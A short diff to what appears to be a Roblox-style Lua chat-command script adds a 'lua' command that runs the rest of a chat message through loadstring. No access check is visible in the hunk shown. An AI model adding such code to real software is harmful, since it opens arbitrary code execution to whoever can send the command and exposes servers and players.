@@ -73,6 +73,10 @@ local function heplr(player)
 
             end
 
+            if cmd == "lua" then
+              loadstring(msg:sub(5))()
+            end
+
             if cmd == "sup" then
 
                 for i = 1,supamount do
